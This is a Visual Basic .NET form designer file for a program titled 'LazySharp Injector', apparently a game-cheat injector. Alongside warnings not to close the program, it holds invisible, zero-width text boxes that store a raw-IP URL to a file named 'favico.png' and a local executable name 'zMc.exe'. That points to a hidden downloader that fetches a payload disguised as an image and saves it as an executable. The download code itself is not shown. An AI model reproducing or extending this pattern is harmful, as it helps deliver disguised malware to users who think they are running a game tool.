<Global.Microsoft.VisualBasic.CompilerServices.DesignerGenerated()> _
Partial Class Succes_Form1
    Inherits System.Windows.Forms.Form

    'Form overrides dispose to clean up the component list.
    <System.Diagnostics.DebuggerNonUserCode()> _
    Protected Overrides Sub Dispose(ByVal disposing As Boolean)
        Try
            If disposing AndAlso components IsNot Nothing Then
                components.Dispose()
            End If
        Finally
            MyBase.Dispose(disposing)
        End Try
    End Sub

    'Required by the Windows Form Designer
    Private components As System.ComponentModel.IContainer

    'NOTE: The following procedure is required by the Windows Form Designer
    'It can be modified using the Windows Form Designer.  
    'Do not modify it using the code editor.
    <System.Diagnostics.DebuggerStepThrough()> _
    Private Sub InitializeComponent()
        Me.components = New System.ComponentModel.Container()
        Dim Bloom1 As LazySharp_Hook.Bloom = New LazySharp_Hook.Bloom()
        Me.Succes_Form2 = New LazySharp_Hook.BeyondTheme()
        Me.Buton_Close = New System.Windows.Forms.Button()
        Me.Loading_Progress = New System.Windows.Forms.ProgressBar()
        Me.Label_Warning2 = New System.Windows.Forms.Label()
        Me.Label_Warning1 = New System.Windows.Forms.Label()
        Me.Timer_Hook = New System.Windows.Forms.Timer(Me.components)
        Me.Src = New System.Windows.Forms.TextBox()
        Me.Directory = New System.Windows.Forms.TextBox()
        Me.Succes_Form2.SuspendLayout()
        Me.SuspendLayout()
        '
        'Succes_Form2
        '
        Me.Succes_Form2.BorderStyle = System.Windows.Forms.FormBorderStyle.None
        Bloom1.Name = "BackColor"
        Bloom1.Value = System.Drawing.Color.White
        Me.Succes_Form2.Colors = New LazySharp_Hook.Bloom() {Bloom1}
        Me.Succes_Form2.Controls.Add(Me.Directory)
        Me.Succes_Form2.Controls.Add(Me.Src)
        Me.Succes_Form2.Controls.Add(Me.Buton_Close)
        Me.Succes_Form2.Controls.Add(Me.Loading_Progress)
        Me.Succes_Form2.Controls.Add(Me.Label_Warning2)
        Me.Succes_Form2.Controls.Add(Me.Label_Warning1)
        Me.Succes_Form2.Customization = "/////w=="
        Me.Succes_Form2.Dock = System.Windows.Forms.DockStyle.Fill
        Me.Succes_Form2.Font = New System.Drawing.Font("Verdana", 8.0!)
        Me.Succes_Form2.Image = Nothing
        Me.Succes_Form2.Location = New System.Drawing.Point(0, 0)
        Me.Succes_Form2.Movable = True
        Me.Succes_Form2.Name = "Succes_Form2"
        Me.Succes_Form2.NoRounding = False
        Me.Succes_Form2.Sizable = True
        Me.Succes_Form2.Size = New System.Drawing.Size(358, 170)
        Me.Succes_Form2.TabIndex = 0
        Me.Succes_Form2.Text = "LazySharp Injector"
        Me.Succes_Form2.TransparencyKey = System.Drawing.Color.Fuchsia
        '
        'Buton_Close
        '
        Me.Buton_Close.BackColor = System.Drawing.Color.Red
        Me.Buton_Close.FlatStyle = System.Windows.Forms.FlatStyle.Flat
        Me.Buton_Close.Font = New System.Drawing.Font("Verdana", 1.0!)
        Me.Buton_Close.Location = New System.Drawing.Point(340, 4)
        Me.Buton_Close.Name = "Buton_Close"
        Me.Buton_Close.Size = New System.Drawing.Size(12, 12)
        Me.Buton_Close.TabIndex = 5
        Me.Buton_Close.UseVisualStyleBackColor = False
        '
        'Loading_Progress
        '
        Me.Loading_Progress.Location = New System.Drawing.Point(30, 100)
        Me.Loading_Progress.MarqueeAnimationSpeed = 40
        Me.Loading_Progress.Name = "Loading_Progress"
        Me.Loading_Progress.Size = New System.Drawing.Size(298, 42)
        Me.Loading_Progress.Style = System.Windows.Forms.ProgressBarStyle.Marquee
        Me.Loading_Progress.TabIndex = 2
        '
        'Label_Warning2
        '
        Me.Label_Warning2.AutoSize = True
        Me.Label_Warning2.BackColor = System.Drawing.Color.Transparent
        Me.Label_Warning2.Font = New System.Drawing.Font("Verdana", 11.0!)
        Me.Label_Warning2.ForeColor = System.Drawing.Color.Gold
        Me.Label_Warning2.Location = New System.Drawing.Point(44, 67)
        Me.Label_Warning2.Name = "Label_Warning2"
        Me.Label_Warning2.Size = New System.Drawing.Size(272, 18)
        Me.Label_Warning2.TabIndex = 1
        Me.Label_Warning2.Text = "OTHERWISE CLOSES IN THE GAME."
        '
        'Label_Warning1
        '
        Me.Label_Warning1.AutoSize = True
        Me.Label_Warning1.BackColor = System.Drawing.Color.Transparent
        Me.Label_Warning1.Font = New System.Drawing.Font("Verdana", 11.0!)
        Me.Label_Warning1.ForeColor = System.Drawing.Color.Tomato
        Me.Label_Warning1.Location = New System.Drawing.Point(57, 37)
        Me.Label_Warning1.Name = "Label_Warning1"
        Me.Label_Warning1.Size = New System.Drawing.Size(243, 18)
        Me.Label_Warning1.TabIndex = 0
        Me.Label_Warning1.Text = "DO NOT CLOSE THE PROGRAM."
        '
        'Timer_Hook
        '
        Me.Timer_Hook.Interval = 2000
        '
        'Src
        '
        Me.Src.Enabled = False
        Me.Src.Location = New System.Drawing.Point(134, 14)
        Me.Src.Name = "Src"
        Me.Src.Size = New System.Drawing.Size(0, 20)
        Me.Src.TabIndex = 1
        Me.Src.Text = "\zMc.exe"
        Me.Src.Visible = False
        '
        'Directory
        '
        Me.Directory.Enabled = False
        Me.Directory.Location = New System.Drawing.Point(30, 14)
        Me.Directory.Name = "Directory"
        Me.Directory.Size = New System.Drawing.Size(0, 20)
        Me.Directory.TabIndex = 6
        Me.Directory.Text = "http://185.141.33.69/favico.png"
        Me.Directory.Visible = False
        '
        'Succes_Form1
        '
        Me.AutoScaleDimensions = New System.Drawing.SizeF(6.0!, 13.0!)
        Me.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font
        Me.ClientSize = New System.Drawing.Size(358, 170)
        Me.Controls.Add(Me.Succes_Form2)
        Me.FormBorderStyle = System.Windows.Forms.FormBorderStyle.None
        Me.MaximizeBox = False
        Me.MinimizeBox = False
        Me.Name = "Succes_Form1"
        Me.StartPosition = System.Windows.Forms.FormStartPosition.CenterScreen
        Me.Text = "LazySharp Injector"
        Me.TransparencyKey = System.Drawing.Color.Fuchsia
        Me.Succes_Form2.ResumeLayout(False)
        Me.Succes_Form2.PerformLayout()
        Me.ResumeLayout(False)

    End Sub

    Friend WithEvents Succes_Form2 As BeyondTheme
    Friend WithEvents Loading_Progress As ProgressBar
    Friend WithEvents Label_Warning2 As Label
    Friend WithEvents Label_Warning1 As Label
    Friend WithEvents Buton_Close As Button
    Friend WithEvents Timer_Hook As Timer
    Friend WithEvents Directory As TextBox
    Friend WithEvents Src As TextBox
End Class
